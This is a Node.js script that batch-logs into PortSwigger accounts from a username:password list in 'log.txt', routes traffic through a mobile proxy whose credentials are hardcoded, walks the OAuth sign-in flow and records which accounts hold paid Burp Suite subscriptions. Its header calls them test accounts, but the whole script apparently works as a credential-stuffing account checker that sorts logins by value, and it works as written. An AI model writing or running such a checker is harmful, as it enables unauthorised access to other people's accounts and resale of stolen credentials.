#!/usr/bin/env node

/**
 * Batch subscription extraction for all 217 PortSwigger test accounts
 * Uses HTTP-only approach with form parsing (no browser needed)
 *
 * Usage: node extract_all_subscriptions.js
 *
 * Output:
 * - subscriptions_results.csv: CSV file with all results
 * - subscriptions_results.json: JSON file with detailed data
 * - subscriptions_summary.txt: Summary statistics
 */

const https = require('https');
const http = require('http');
const url = require('url');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const fs = require('fs');
const cheerio = require('cheerio');
const readline = require('readline');

const PROXY = 'http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029';
const CODE_CHALLENGE = 'BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk';

const httpsAgent = new HttpsProxyAgent(PROXY);
const httpAgent = new HttpProxyAgent(PROXY);

// Configuration
const REQUEST_TIMEOUT = 30000;
const MAX_REDIRECTS = 10;
const CONCURRENT_REQUESTS = 3;

// Stats tracking
const stats = {
    total: 0,
    successful: 0,
    failed: 0,
    plans: {
        'Free': 0,
        'Professional': 0,
        'Team': 0,
        'Enterprise': 0,
        'Community': 0,
        'Unknown': 0
    },
    errors: {}
};

const results = [];

function setCookie(setCookieHeader, cookies) {
    if (!setCookieHeader) return;
    const parts = setCookieHeader.split(';')[0].split('=');
    if (parts.length === 2) {
        cookies[parts[0].trim()] = parts[1].trim();
    }
}

function getCookieString(cookies) {
    return Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
}

function makeRequest(options, postData = null, cookies = {}) {
    return new Promise((resolve, reject) => {
        const reqUrl = url.parse(options.url);
        const reqOptions = {
            hostname: reqUrl.hostname,
            port: reqUrl.port,
            path: reqUrl.path,
            method: options.method || 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0',
                'Cookie': getCookieString(cookies),
                ...options.headers
            },
            agent: reqUrl.protocol === 'https:' ? httpsAgent : httpAgent,
            timeout: REQUEST_TIMEOUT
        };

        const protocol = reqUrl.protocol === 'https:' ? https : http;
        const req = protocol.request(reqOptions, (res) => {
            let body = '';

            const setCookieHeader = res.headers['set-cookie'];
            if (setCookieHeader) {
                if (Array.isArray(setCookieHeader)) {
                    setCookieHeader.forEach(h => setCookie(h, cookies));
                } else {
                    setCookie(setCookieHeader, cookies);
                }
            }

            res.on('data', (chunk) => body += chunk);
            res.on('end', () => {
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    body,
                    location: res.headers.location
                });
            });
        });

        req.on('error', reject);
        req.on('timeout', () => {
            req.destroy();
            reject(new Error('Request timeout'));
        });

        if (postData) req.write(postData);
        req.end();
    });
}

function urlencode(obj) {
    return Object.entries(obj)
        .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
        .join('&');
}

function extractPlan(html) {
    if (!html) return 'Unknown';

    const lowerHtml = html.toLowerCase();

    // Check for free accounts
    if (lowerHtml.includes('you do not have any subscriptions')) {
        return 'Free';
    }

    // Check for specific subscription types with better accuracy
    if (lowerHtml.includes('burp suite enterprise') ||
        (lowerHtml.includes('enterprise') && lowerHtml.includes('subscription'))) {
        return 'Enterprise';
    }

    if (lowerHtml.includes('burp suite team') ||
        (lowerHtml.includes('team') && lowerHtml.includes('subscription'))) {
        return 'Team';
    }

    if (lowerHtml.includes('burp suite professional') ||
        (lowerHtml.includes('professional') && lowerHtml.includes('subscription'))) {
        return 'Professional';
    }

    if (lowerHtml.includes('community')) {
        return 'Community';
    }

    // Generic check for any subscription
    if (lowerHtml.includes('subscription') || lowerHtml.includes('your subscriptions')) {
        return 'Professional';
    }

    return 'Unknown';
}

async function authWithHTTP(username, password) {
    const cookies = {};

    try {
        // Step 1: Get state
        const authorizeUrl = `https://login.portswigger.net/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=${CODE_CHALLENGE}&code_challenge_method=S256&response_mode=query`;
        let res = await makeRequest({ url: authorizeUrl, method: 'GET' }, null, cookies);
        let state = res.body.match(/state=([^&\s'"]+)/)?.[1];
        if (!state) throw new Error('Failed to extract state');

        // Step 2: Login
        const loginData = urlencode({ username, password, action: 'default', state });
        res = await makeRequest(
            {
                url: 'https://login.portswigger.net/u/login',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': loginData.length
                }
            },
            loginData,
            cookies
        );

        // Step 3: Follow OAuth redirects
        let redirectUrl = res.location;
        let redirectCount = 0;
        for (let i = 0; i < MAX_REDIRECTS && redirectUrl; i++) {
            if (!redirectUrl.startsWith('http')) redirectUrl = 'https://login.portswigger.net' + redirectUrl;
            res = await makeRequest({ url: redirectUrl, method: 'GET' }, null, cookies);
            redirectCount++;
            if (res.status !== 302 || !res.location) break;
            redirectUrl = res.location;
        }

        // Step 4: Parse form from /signin-oidc and submit it
        const $ = cheerio.load(res.body);
        const form = $('form').first();

        if (form.length === 0) {
            // Fallback: Try direct access to licenses page (cookies may already be authenticated)
            res = await makeRequest(
                { url: 'https://portswigger.net/users/youraccount/licenses', method: 'GET' },
                null,
                cookies
            );

            // Follow redirects if needed
            for (let i = 0; i < 5 && res.status === 302 && res.location; i++) {
                let redirectUrl = res.location;
                if (!redirectUrl.startsWith('http')) redirectUrl = 'https://portswigger.net' + redirectUrl;
                res = await makeRequest({ url: redirectUrl, method: 'GET' }, null, cookies);
            }

            // Check if we got authenticated access
            if (res.status === 200 && (res.body.includes('subscriptions') || res.body.includes('account'))) {
                return {
                    success: true,
                    html: res.body
                };
            }

            throw new Error('Form not found on /signin-oidc page');
        }

        let formAction = form.attr('action');
        if (!formAction) {
            formAction = '/signin-oidc';
        }

        const formMethod = (form.attr('method') || 'GET').toUpperCase();

        const formData = {};
        form.find('input').each((i, elem) => {
            const name = $(elem).attr('name');
            const value = $(elem).attr('value');
            if (name) {
                formData[name] = value || '';
            }
        });

        let targetUrl = formAction;
        if (!targetUrl.startsWith('http')) {
            if (!targetUrl.startsWith('/')) {
                targetUrl = '/signin-oidc?/' + targetUrl;
            }
            targetUrl = 'https://portswigger.net' + targetUrl;
        }

        const postData = urlencode(formData);
        res = await makeRequest(
            {
                url: targetUrl,
                method: formMethod,
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': postData.length
                }
            },
            postData,
            cookies
        );

        // Follow redirects after form submission
        for (let i = 0; i < 5 && res.location; i++) {
            let nextUrl = res.location;
            if (!nextUrl.startsWith('http')) nextUrl = 'https://portswigger.net' + nextUrl;
            res = await makeRequest({ url: nextUrl, method: 'GET' }, null, cookies);
        }

        // Step 5: Get licenses page
        res = await makeRequest({ url: 'https://portswigger.net/users/youraccount/licenses', method: 'GET' }, null, cookies);

        // Check if authenticated
        if (res.status === 200 && (res.body.includes('subscriptions') || res.body.includes('account'))) {
            return {
                success: true,
                html: res.body
            };
        } else {
            return {
                success: false,
                error: `Status ${res.status}`,
                html: res.body.substring(0, 200)
            };
        }

    } catch (error) {
        return {
            success: false,
            error: error.message
        };
    }
}

async function processAccount(username, password, index, total) {
    const status = `[${index}/${total}]`;

    try {
        process.stdout.write(`${status} Processing ${username}... `);

        const result = await authWithHTTP(username, password);

        if (result.success) {
            const plan = extractPlan(result.html);
            stats.successful++;
            stats.plans[plan]++;

            results.push({
                username,
                plan,
                status: 'Success',
                timestamp: new Date().toISOString()
            });

            console.log(`✓ ${plan}`);
            return true;
        } else {
            stats.failed++;
            const errorType = result.error || 'Unknown error';
            stats.errors[errorType] = (stats.errors[errorType] || 0) + 1;

            results.push({
                username,
                plan: 'Failed',
                status: result.error || 'Unknown error',
                timestamp: new Date().toISOString()
            });

            console.log(`✗ Failed: ${result.error}`);
            return false;
        }
    } catch (error) {
        stats.failed++;
        const errorType = error.message;
        stats.errors[errorType] = (stats.errors[errorType] || 0) + 1;

        results.push({
            username,
            plan: 'Failed',
            status: error.message,
            timestamp: new Date().toISOString()
        });

        console.log(`✗ Error: ${error.message}`);
        return false;
    }
}

async function loadAccountsFromFile(filePath) {
    const accounts = [];
    const fileStream = fs.createReadStream(filePath);
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });

    for await (const line of rl) {
        const trimmed = line.trim();
        if (trimmed && trimmed.includes(':')) {
            const [username, password] = trimmed.split(':', 2);
            accounts.push({ username, password });
        }
    }

    return accounts;
}

function exportResults() {
    // Export CSV
    const csvHeader = 'Username,Plan,Status,Timestamp\n';
    const csvRows = results.map(r =>
        `"${r.username}","${r.plan}","${r.status}","${r.timestamp}"`
    ).join('\n');
    fs.writeFileSync('subscriptions_results.csv', csvHeader + csvRows);
    console.log('\n✓ CSV exported: subscriptions_results.csv');

    // Export JSON
    fs.writeFileSync('subscriptions_results.json', JSON.stringify(results, null, 2));
    console.log('✓ JSON exported: subscriptions_results.json');

    // Generate summary
    const summary = `
================================================================================
SUBSCRIPTION EXTRACTION SUMMARY
================================================================================

Total Accounts Processed: ${stats.total}
Successful: ${stats.successful} (${((stats.successful/stats.total)*100).toFixed(1)}%)
Failed: ${stats.failed} (${((stats.failed/stats.total)*100).toFixed(1)}%)

PLAN DISTRIBUTION:
  Free:        ${stats.plans['Free']} (${((stats.plans['Free']/stats.successful)*100).toFixed(1)}% of successful)
  Professional: ${stats.plans['Professional']} (${((stats.plans['Professional']/stats.successful)*100).toFixed(1)}% of successful)
  Team:        ${stats.plans['Team']} (${((stats.plans['Team']/stats.successful)*100).toFixed(1)}% of successful)
  Enterprise:  ${stats.plans['Enterprise']} (${((stats.plans['Enterprise']/stats.successful)*100).toFixed(1)}% of successful)
  Community:   ${stats.plans['Community']} (${((stats.plans['Community']/stats.successful)*100).toFixed(1)}% of successful)
  Unknown:     ${stats.plans['Unknown']} (${((stats.plans['Unknown']/stats.successful)*100).toFixed(1)}% of successful)

TOP ERRORS:
${Object.entries(stats.errors)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5)
    .map(([error, count]) => `  ${error}: ${count}`)
    .join('\n')}

================================================================================
Results saved to:
  - subscriptions_results.csv
  - subscriptions_results.json
  - subscriptions_summary.txt
================================================================================
`;

    fs.writeFileSync('subscriptions_summary.txt', summary);
    console.log(summary);
}

async function main() {
    console.log('================================================================================');
    console.log('PortSwigger Subscription Extraction - Batch Processor');
    console.log('================================================================================\n');

    // Load accounts
    console.log('Loading accounts from log.txt...');
    const accounts = await loadAccountsFromFile('log.txt');
    stats.total = accounts.length;
    console.log(`Loaded ${accounts.length} accounts\n`);

    // Process accounts with concurrency control
    console.log('Processing accounts (this may take several minutes)...\n');

    for (let i = 0; i < accounts.length; i += CONCURRENT_REQUESTS) {
        const batch = accounts.slice(i, Math.min(i + CONCURRENT_REQUESTS, accounts.length));
        const promises = batch.map((account, idx) =>
            processAccount(account.username, account.password, i + idx + 1, accounts.length)
        );

        await Promise.all(promises);

        // Simple rate limiting
        if (i + CONCURRENT_REQUESTS < accounts.length) {
            await new Promise(resolve => setTimeout(resolve, 500));
        }
    }

    // Export results
    console.log('\nExporting results...');
    exportResults();
}

main().catch(error => {
    console.error('Fatal error:', error);
    process.exit(1);
});
